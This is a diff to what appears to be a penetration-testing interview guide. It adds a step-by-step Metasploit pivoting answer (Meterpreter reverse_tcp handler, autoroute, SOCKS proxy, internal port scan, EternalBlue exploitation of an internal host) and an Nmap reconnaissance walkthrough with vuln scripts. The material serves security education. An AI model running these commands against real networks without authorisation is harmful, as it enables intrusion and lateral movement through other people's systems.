@@ -78,6 +78,7 @@ TOC:
    8.6 How do you bypass WAFs or input filters during web exploitation?
    8.7 You compromised a low-priv shell on a Linux host — how would you try to escalate privileges?
    8.8 Explain how to pivot from a compromised internal machine to the rest of the network.
+   8.9 How do you use Nmap for reconnaissance?
 
 ---
 
@@ -3304,19 +3305,200 @@ Understanding how filters detect patterns and avoiding them with subtle variatio
 
 8.8 Explain how to pivot from a compromised internal machine to the rest of the network.
 
+## 🔁 **Pivoting with Metasploit (Step-by-Step)**
 
+### ✅ **1. Get a Meterpreter Session**
 
+* First, gain a **Meterpreter shell** on the compromised internal machine.
 
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your_ip>
+set LPORT <your_port>
+run
+```
 
+---
 
+### 🧠 **2. Add a Route to the Internal Network**
 
+Tell Metasploit that the compromised machine can reach an internal subnet:
 
+```bash
+run post/multi/manage/autoroute
+```
 
+* It will detect and route internal subnets like `192.168.x.x` or `10.x.x.x`.
 
+You can also manually add:
 
+```bash
+run autoroute -s 192.168.10.0/24
+```
 
+---
 
+### 🔌 **3. Start a SOCKS Proxy**
 
+Start a SOCKS server inside Metasploit:
 
+```bash
+use auxiliary/server/socks_proxy
+run
+```
 
+* This lets you use proxy-aware tools like `proxychains` to access internal hosts.
 
+---
+
+### 🌐 **4. Scan the Internal Network**
+
+Use Metasploit modules to enumerate internal hosts and services:
+
+```bash
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.10.0/24
+set PORTS 22,80,445,3389
+run
+```
+
+---
+
+### 💣 **5. Exploit New Internal Targets**
+
+After discovering a vulnerable internal host:
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.10.5
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your IP>
+run
+```
+
+This gives you a **second Meterpreter session** from inside the network.
+
+---
+
+### ✅ Summary
+
+> Using **`autoroute`** to define pivot paths and **`socks_proxy`** for routing, Metasploit allows full internal network access from 
+a single compromised host — all from within the framework.
+
+-
+
+8.9 How do you use Nmap for reconnaissance?
+
+Nmap helps you identify:
+
+* Live hosts
+* Open ports
+* Running services and versions
+* Operating systems
+* Known vulnerabilities (via scripts)
+
+---
+
+## 🧪 **Step-by-Step Nmap Recon Usage**
+
+### ✅ 1. **Ping Scan (Host Discovery)**
+
+Find live hosts in a subnet:
+
+```bash
+nmap -sn 192.168.1.0/24
+```
+
+> This tells you which machines are online.
+
+---
+
+### ✅ 2. **Port Scanning**
+
+Scan top 1000 TCP ports (default):
+
+```bash
+nmap 192.168.1.10
+```
+
+Full port scan (1–65535):
+
+```bash
+nmap -p- 192.168.1.10
+```
+
+---
+
+### ✅ 3. **Service & Version Detection**
+
+Identify what services are running:
+
+```bash
+nmap -sV 192.168.1.10
+```
+
+---
+
+### ✅ 4. **Operating System Detection**
+
+Fingerprint the OS:
+
+```bash
+nmap -O 192.168.1.10
+```
+
+---
+
+### ✅ 5. **Aggressive Scan (All-in-One)**
+
+Combines OS, version, script, and traceroute:
+
+```bash
+nmap -A 192.168.1.10
+```
+
+> Use with caution—very noisy.
+
+---
+
+### ✅ 6. **Scan Multiple Hosts or Subnets**
+
+```bash
+nmap -sV 192.168.1.10 192.168.1.11
+nmap -sV 192.168.1.0/24
+```
+
+---
+
+### ✅ 7. **Use NSE Scripts for Deeper Recon**
+
+```bash
+nmap --script=vuln 192.168.1.10
+nmap --script=http-title,http-enum -p 80,443 192.168.1.10
+```
+
+> NSE = Nmap Scripting Engine (great for detecting known vulns, enum users, web info, etc.)
+
+---
+
+## ⚙️ **Common Nmap Flags**
+
+| Flag  | Description                             |
+| ----- | --------------------------------------- |
+| `-sS` | Stealth/SYN scan                        |
+| `-sV` | Version detection                       |
+| `-O`  | OS detection                            |
+| `-p-` | All 65535 ports                         |
+| `-T4` | Faster timing (default is T3)           |
+| `-A`  | Aggressive mode (OS + version + script) |
+| `-Pn` | Skip host discovery (assume up)         |
+
+---
+
+## ✅ Summary
+
+> Nmap is your first go-to for **network reconnaissance**. 
+You can find **live hosts, open ports, services, OS**, and even run **vulnerability scans** — all from one powerful tool.
+
+--
